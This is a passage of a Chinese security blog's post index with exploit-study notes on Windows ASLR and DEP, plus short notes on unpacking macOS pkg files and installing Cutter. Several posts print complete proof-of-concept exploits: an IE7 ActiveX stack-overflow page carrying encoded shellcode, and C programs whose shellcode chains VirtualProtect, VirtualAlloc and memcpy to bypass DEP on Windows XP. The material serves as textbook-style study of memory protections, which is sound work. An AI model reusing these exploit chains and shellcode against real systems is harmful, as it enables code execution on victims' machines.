2008，优化：禁用优化，GS选项：关闭，DEP选项：/NXCOMPAT:NO，build版本：release\n编译程序，运行，直接弹出窗口并成功，重启也一样，如图 ","date":"2020-11-26T17:54:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-018-%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86%E8%A6%86%E7%9B%96%E5%AE%9A%E4%BD%8D/","title":"漏洞利用学习笔记-018-利用部分覆盖定位"},{"content":"本文来源：Moeomu的博客\nASLR技术简介 纵观前面介绍的所有漏洞利用方法都有着一个共同的特征：都需要确定一个明确的跳转地址。无论是JMP ESP等通用跳板指令还是Ret2Libc使用的各指令，我们都要先确定这条指令的入口点。所谓惹不起躲得起，微软的ASLR(Address Space Layout Randomization)技术就是通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制\n实际上ASLR的概念在Windows XP时代就已经提出来了，只不过XP上面的ASLR功能很有限，只是对PEB和TEB进行了简单的随机化处理，而对于模块的加载基址没有进行随机化处理，直到Windows Vista出现后，ASLR才真正开始发挥作用\n与SafeSEH类似ASLR的实现也需要程序自身的支持和操作系统的双重支持，其中程序的支持不是必需的\n支持ASLR的程序在它的PE头中会设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识来说明其支持ASLR。微软从Visual Studio 2005 SP1开始加入了/dynamicbase链接选项来帮我们完成这个任务，我们只需要在编译程序的时候启用/dynmicbase链接选项，编译好的程序就支持ASLR了 映像随机化 映像随机化是在PE文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启后这个地址会变化 可能是出于兼容性的考虑，微软在系统中设置了映像随机化的开关，用户可以通过设置注册表中HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionM anager\\MemoryManagement\\MoveImages的键值来设定映像随机化的工作模式 设置为0时映像随机化将禁用 设置为−1时强制对可随机化的映像进行处理，无论是否设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识 设置为其他值时为正常工作模式，只对具有随机化处理标识的映像进行处理 如果注册表中不存在MoveImages，大家可以手工建立名称为MoveImages，类型为DWORD的值，并根据需要设置它的值 堆栈随机化 这项措施是在程序运行时随机的选择堆栈的基址，与映像基址随机化不同的是堆栈的基址不是在系统启动的时候确定的，而是在打开程序的时候确定的，也就是说同一个程序任意两次运行时的堆栈基址都是不同的，进而各变量在内存中的位置也就是不确定的 将以下程序在VS2008中编译，在XP和Vista上分别运行两次，得到如下图的结果 1 2 3 4 5 6 7 8 9 int main() { char* heap = (char *)malloc(100); char stack[100]; printf(\u0026#34;Address of heap:%#0.4x\\nAddress of stack:%#0.4x\u0026#34;, heap, stack); getchar(); return 0; } 可以看出，Vista上堆地址相去甚远，而XP上完全相同 PEB和TEB的随机化 获取当前进程的TEB和PEB很简单，TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30的位置，可以通过如下代码来获取当前进程的TEB和PEB 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int main() { unsigned int teb; unsigned int peb; __asm { mov eax, FS:[0x18] mov teb, eax mov eax, dword ptr[eax+0x30] mov peb, eax } printf(\u0026#34;PEB:%#x\\nTEB:%#x\u0026#34;, peb, teb); getchar(); return 0; } 在Vista上测试运行，结果如图 可以看出，效果非常差劲，PEB地址只随机化了一个字节，而且还是非常有规律，TEB基本没变过 ASLR的缺陷 不难看出，ASLR随机化映像的时候，虽然模块的加载基址改变了，但是各个模块的入口点的低位两个字节是不会改变的，举例：原基址：0x00401234，随机化后基址变为：0x67291234，因此可以以此攻击它 攻击未启用ASLR的模块 准备工作 实验环境：Windows Vista SP0，IE7，Adobe Flash Player 9.0.124\n虽然书上要求使用9.0.262版本，但是实在是找不到，就以9.0.124来替代了，点此下载 存在漏洞的OCX控件在之前的实验中已经编译了一个了，因此就使用那个了，点此下载，此控件ctrl class object id：ACA3927C-6BD1-4B4E-8697-72481279AAEC 步骤 重启系统查看ASLR模块启用情况 实验控件未启用GS 通过IE7加载POC页面和Flash9k.ocx 函数test存在栈溢出漏洞，目标是覆盖函数的 返回地址 因为Flash9k.ocx未启用ASLR因此加载基址固定，可以在里面搜寻合适的跳板指令跳转到shellcode IE7的DEP是关闭的，因此不考虑DEP的影响 因为通过覆盖函数返回地址实现攻击，因此最佳的跳板指令是JMP ESP 0x301D606B也是JMP ESP，执行后将会跳转到字符串的头部，但是问题是6B 60 1D 30四个字节正好构成一句汇编指令imul esp,dword ptr ds:[eax+0x1D],0x30，它将会把后两个操作数相乘，随后放到第一个操作数中，因此需要保持[eax+0x1D]的值是正确的，而目前eax并未指向有效地址，因此需要修复eax 很可惜，没有找到合适的修复eax的指令，换地址 0x303911D3也是JMP ESP，但它组成的汇编代码将会同时读取EC和EAX的内容，因此这两个寄存器都需要修复，不可行，换指令 JMP ESP没有，改用JMP ESI，地址0x3000DCD2中包含0，直接排除，地址0x302420C3最后一个字节是retn，无法使用，排除，地址0x3028EE6E汇编代码将直接引起异常，排除，此指令也没有合适的了，因此寻找其它合适指令 位于地址0x300942F2的CALL ESP貌似正合适，它也会将esp增加8个字节正好避开了垃圾数据 以下是改变以后的shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;object classid=\u0026#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\u0026#34; codebase=\u0026#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0\u0026#34; width=\u0026#34;160\u0026#34; height=\u0026#34;260\u0026#34;\u0026gt; \u0026lt;param name=\u0026#34;movie\u0026#34; value=\u0026#34;1.swf\u0026#34; /\u0026gt; \u0026lt;param name=\u0026#34;quality\u0026#34; value=\u0026#34;high\u0026#34; /\u0026gt; \u0026lt;embed src=\u0026#34;1.swf\u0026#34; quality=\u0026#34;high\u0026#34; pluginspage=\u0026#34;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash\u0026#34; type=\u0026#34;application/x-shockwave-flash\u0026#34; width=\u0026#34;160\u0026#34; height=\u0026#34;260\u0026#34;\u0026gt; \u0026lt;/embed\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;object classid=\u0026#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC\u0026#34; id=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;script\u0026gt; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 54) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u42F2\\u3009\u0026#34;; s += \u0026#34;\\u9090\\u9090\u0026#34;; s += \u0026#34;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u616B\\u6F6F\\u4D68\\u7369\\u8B61\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\u0026#34;; test.test(s); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 如图，重启系统，shellcode运行正常，这意味着攻击ASLR成功 ","date":"2020-11-24T21:12:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-017-aslr%E7%AE%80%E4%BB%8B/","title":"漏洞利用学习笔记-017-ASLR简介"},{"content":"本文来源：Moeomu的博客\n起因 ed2k链接没法用motrix下载，准备去下载一个迅雷的精简版，突然发现找出来的是pkg安装包，引起了我的兴趣\n经过 解包 一直以来都很奇怪pkg究竟运行了哪些东西，又干了什么，因此开始第一步，解包 解包只需要一条命令即可：pkgutil --expand 需要解包的pkg.pkg 自定义解包文件夹名 查看 发现有个Res文件，没有后缀，用file查看一下格式发现它被压缩了，索性unar指令解压，出来一个同名文件，但是大小变大了 在finder中右键-打开方式-归档实用工具-app被直接解压出来 将此app拖入/Application中，发现可以直接使用，就此完成任务 看了看其它文件，有个用于打开网页的Unix可执行文件，大概就是推广，没有流氓行为 结果 完成任务 追加 iOS app 安装器的探索 更新了BigSur系统后，发现系统中存在iOS app 安装器这么个东西，但是无法运行，遂探索了一番 查看此软件位置，顺便看看种类，很好，通用，意味着可能以后会支持Intel？ 打开Terminal，进入此文件夹，运行软件，报错，提示需要依赖文件，如图 找到依赖文件所在位置，发现貌似没有东西，原因可能是仅提供ARM版本的依赖程序 Parallels Desktop 无法联网解决办法 依旧是BigSur的问题，PD16又不能联网了，无奈找了个折中的解决办法 运行命令sudo -b /Applications/Parallels\\ Desktop.app/Contents/MacOS/prl_client_app后将会打开PD16，这样就能联网了 这条命令的意思是将此程序以管理员权限运行，但是其实应该是BigSur再次收紧了权限，导致PD16破解出问题 可以将这条命令写入.command文件中放在桌面，这样双击打开也可 ls -l的@符号问题 最近发现有的文件夹/文件会出现@符号的标识，有些奇怪这是什么意思，就简单探究了一下 由于此现象是ls程序出现的，因此问问系统的说明文档，命令man ls 很快啊，啪的一下就出来了，如图 1 -@ 在long(-l)输出中显示扩展的属性键和大小。 非常明了了，就是指的是这种文件/文件夹存在扩展属性，而此属性可以使用xattr -l命令查看 这种属性也可以使用xattr -c完全清理掉 ","date":"2020-11-24T12:56:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/macos-pkg%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91%E8%A7%A3%E6%9E%90/","title":"macOS-pkg文件逆向解析"},{"content":"本文来源：Moeomu的博客\n介绍 Radare2 r2是对radare的一次重写，目的是提供一套处理二进制文件的库和工具。\nRadare项目开始时是一个取证工具，一个能够打开磁盘文件的可编写的命令行十六进制编辑器，但后来增加了对分析二进制文件、反汇编代码、调试程序、附加到远程gdb服务器的支持。\nradare2是可移植的。\n要了解更多信息，你可以阅读官方的radare2书籍，源代码，或者浏览网络上的博客文章或r2con的演讲。\nCutter Cutter是一个由radare2驱动的免费和开源的逆向工程框架。它的目标是建立一个先进的、可定制的、FOSS的逆向工程平台，同时考虑到用户体验。Cutter是由逆向工程师为逆向工程师创建的。 安装 由于Cutter是Radare2的GUI化程序，因此只需要下载Cutter即可\n本次测试系统：macOS Catalina 10.15.7 Github下载链接：github.com/radareorg/cutter/releases Moeomu网盘下载链接(可能不是最新)：Cutter-v1.12.0-x64.dmg macOS Catalina无法运行Cutter的原因 不知道Windows怎么样，反正在macOS Catalina上安装后无法正常运行，解决方法如下\n找出无法正常运行的原因 进入Cutter的文件夹：cd /Applications/Cutter.app/Contents/MacOS/ 直接运行Cutter查看原因：./Cutter 安装gettext解决问题：brew install gettext ","date":"2020-11-21T19:04:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7-radare2%E5%92%8Ccutter/","title":"逆向工具-Radare2和Cutter"},{"content":"本文来源：Moeomu的博客\n利用可执行内存攻击DEP 原理 有的时候在进程的内存空间中会存在一段可读可写可执行的内存，如果我们能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;......\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x8A\\x17\\x84\\x7C\u0026#34;//pop eax retn \u0026#34;\\x0B\\x1A\\xBF\\x7C\u0026#34;//pop pop retn \u0026#34;\\xBA\\xD9\\xBB\\x7C\u0026#34;//修正EBP retn 4 \u0026#34;\\x5F\\x78\\xA6\\x7C\u0026#34;//pop retn \u0026#34;\\x08\\x00\\x14\\x00\u0026#34;//可执行内存中弹出对话框机器码的起始地址 \u0026#34;\\x00\\x00\\x14\\x00\u0026#34;//可执行内存空间地址，复制用 \u0026#34;\\xBF\\x7D\\xC9\\x77\u0026#34;//push esp jmp eax \u0026amp;\u0026amp; 原始 shellcode 起始地址 \u0026#34;\\xFF\\x00\\x00\\x00\u0026#34;//shellcode 长度 \u0026#34;\\xAC\\xAF\\x94\\x7C\u0026#34;//memcpy \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;......\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; ; void test() { char tt[176]; memcpy(tt, shellcode, 450); } int main() { HINSTANCE hInst = LoadLibrary(\u0026#34;shell32.dll\u0026#34;); char temp[200]; test(); return 0; } 后记 按理来说是要有RWE权限的内存区域的，可惜么得，此实验未完成 利用.NET攻击DEP 原理 .NET 的文件具有和与PE文件一样的结构，也就是说它也具有.text等段，这些段也会被映射到内存中，也会具备一定的可执行属性。大家应该想到如何利用这一点了，将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了 需求 具有溢出漏洞的ActiveX控件 包含有shellcode的.NET控件 可以触发ActiveX控件中溢出漏洞的POC页面 代码 具有溢出漏洞的ActiveX控件\n1 2 3 4 5 6 7 8 void CVulnerAXCtrl::test(LPCTSTR str) { // AFX_MANAGE_STATE(AfxGetStaticModuleState()); // TODO: Add your dispatch handler code here printf(\u0026#34;aaaa\u0026#34;); // 定位该函数的标记 char dest[100]; sprintf(dest, \u0026#34;%s\u0026#34;, str); } 包含有shellcode的.NET控件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 using System; using System.Collections.Generic; using System.Linq; using System.Text; namespace DEP_NETDLL { public class Class1 { public void Shellcode() { string shellcode = \u0026#34;\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\u0026#34; + \u0026#34;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\u0026#34; + \u0026#34;\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\u0026#34; + \u0026#34;\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\u0026#34; + \u0026#34;\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\u0026#34; + \u0026#34;\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\u0026#34; + \u0026#34;\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\u0026#34; + \u0026#34;\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\u0026#34; + \u0026#34;\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\u0026#34; + \u0026#34;\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\u0026#34; + \u0026#34;\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\u0026#34; + \u0026#34;\\uff53\\ufc57\\uff53\\uf857\u0026#34; ; } } } 利用Java Applet挑战DEP 难以找到适合的版本，所以此实验略过，以后有机会再补充\n","date":"2020-11-20T14:13:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-016-%E5%88%A9%E7%94%A8%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98%E5%92%8C.net%E6%94%BB%E5%87%BBdep/","title":"漏洞利用学习笔记-016-利用可执行内存和.NET攻击DEP"},{"content":"本文来源：Moeomu的博客\n利用VirtualProtect攻击DEP 原理 利用VirtualProtect函数将栈页内存属性改为可执行\n前置内容 VirtualProtect参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 BOOL VirtualProtect( LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ); // 所以可以这样写 BOOL VirtualProtect( shellcode 所在内存空间起始地址, shellcode 大小, 0x40, 某个可写地址 ); 这里势必存在0，因此攻击函数换为memcpy 步骤 修复EBP，这样调用函数的时候不会内存读取违规而异常 填入VirtualProtect的地址，将会返回于此 填入空的指令 填入返回地址 填入函数的参数 填入shellcode本身 代码 模拟环境：系统：Windows XP SP3，DEP：Optout，编译器：VC6，编译选项：禁用优化，版本：release\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #include\u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x85\\x8B\\x1D\\x5D\u0026#34; // push esp pop ebp ret `fix ebp` \u0026#34;\\xD4\\x1A\\x80\\x7C\u0026#34; // VirtualProtect Address \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x8C\\xFE\\x12\\x00\u0026#34; // ret Address \u0026#34;\\xB0\\xFD\\x12\\x00\u0026#34; // Param Address: 0x0012FDB0 \u0026#34;\\xFF\\x00\\x00\\x00\u0026#34; // Param Size: 0x100 \u0026#34;\\x40\\x00\\x00\\x00\u0026#34; // Param NewProtect: 0x40 \u0026#34;\\x00\\x00\\x3F\\x00\u0026#34; // Param pOldProtect: 0x00910000 \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; // payload \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; ; void test() { char str[176]; memcpy(str, shellcode, 420); } int main() { HINSTANCE hInst = LoadLibrary(\u0026#34;shell32.dll\u0026#34;); char temp[200]; test(); return 0; } 利用VirtualAlloc攻击DEP 前置内容 VirtualAlloc参数 1 2 3 4 5 6 LPVOID WINAPI VirtualAlloc( __in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect ) 参数说明 lpAddress，申请内存区域的地址，如果这个参数是NULL，系统将会决定分配内存区域的位置，并且按64KB向上取整 dwSize，申请内存区域的大小 flAllocationType，申请内存的类型 flProtect，申请内存的访问控制类型，如读、写、执行等权限。内存申请成功时函数返回申请内存的起始地址，申请失败时返回NULL 代码 模拟环境：系统：Windows XP SP3，DEP：Optout，编译器：VC6，编译选项：禁用优化，版本：release\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x85\\x8B\\x1D\\x5D\u0026#34; // push esp pop ebp ret 4 \u0026#34;\\xE1\\x9A\\x80\\x7C\u0026#34; // Address of VirtualAlloc \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x70\\x6F\\xC1\\x77\u0026#34; // VirtualAlloc ret address \u0026#34;\\x00\\x00\\x03\\x00\u0026#34; // Param: lpAddress \u0026#34;\\xFF\\x00\\x00\\x00\u0026#34; // Param: dwSize \u0026#34;\\x00\\x10\\x00\\x00\u0026#34; // Param: flAllocationType \u0026#34;\\x40\\x00\\x00\\x00\u0026#34; // Param: flProtect \u0026#34;\\x00\\x00\\x03\\x00\u0026#34; // memcpy ret address \u0026#34;\\x00\\x00\\x03\\x00\u0026#34; // Param: destin \u0026#34;\\x94\\xFE\\x13\\x00\u0026#34; // Param: source \u0026#34;\\xFF\\x00\\x00\\x00\u0026#34; // Param: n \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; // payload \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; ; void test() { char tt[176]; memcpy(tt, shellcode, 450); } int main() { HINSTANCE hInst = LoadLibrary(\u0026#34;shell32.dll\u0026#34;); char temp[200]; test(); return 0; } 技术细节 首先使用VirtualAlloc申请一段空间用于执行shellcode 随后使用memcpy将shellcode复制过去 最后在memcpy返回时直接返回到shellcode payload的起始地址 ","date":"2020-11-19T17:43:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-015-%E5%88%A9%E7%94%A8virtualprotect%E5%92%8Cvirtualalloc%E6%94%BB%E5%87%BBdep/","title":"漏洞利用学习笔记-015-利用VirtualProtect和VirtualAlloc攻击DEP"},{"content":"本文来源：Moeomu的博客\nDEP的介绍 溢出攻击的根源是未准确区分数据和代码，但是重新设计计算机结构是不太可能的事情，所以使用各种办法去减缓溢出攻击\n原理 将数据所在的内存页标为不可执行，而程序成功溢出进入shellcode时，CPU将会抛出执行异常 DEP分为软件DEP和硬件DEP，而软件DEP指的是SafeSEH，硬件DEP在AMD平台上称为No-Execute Page-Protection(NX)，Intel平台上称为Execute Disable Bit(XD) 操作系统通过设置内存页的NX和XD标记，来指明不能从此执行代码，PageTable中插入一个标记来标识此页是否运行执行指令，0表示允许，1表示不允许 DEP的工作状态 Optin：允许系统组件和服务使用DEP，其它程序将不予保护，而用户可以通过ACT工具标记程序使用DEP，这种保护可以被程序动态关闭，多用于普通用户操作系统 Output：为排除列表外的程序启用DEP，多用于服务器操作系统 AlwaysOn：对所有的程序应用DEP保护，不可被关闭，只有64位操作系统才使用此模式 AlwaysOff：一般不用 编译选项 /NXCOMPAT编译选项将在PE头中设置IMAGE_DLLCHARACTERISTICS_ 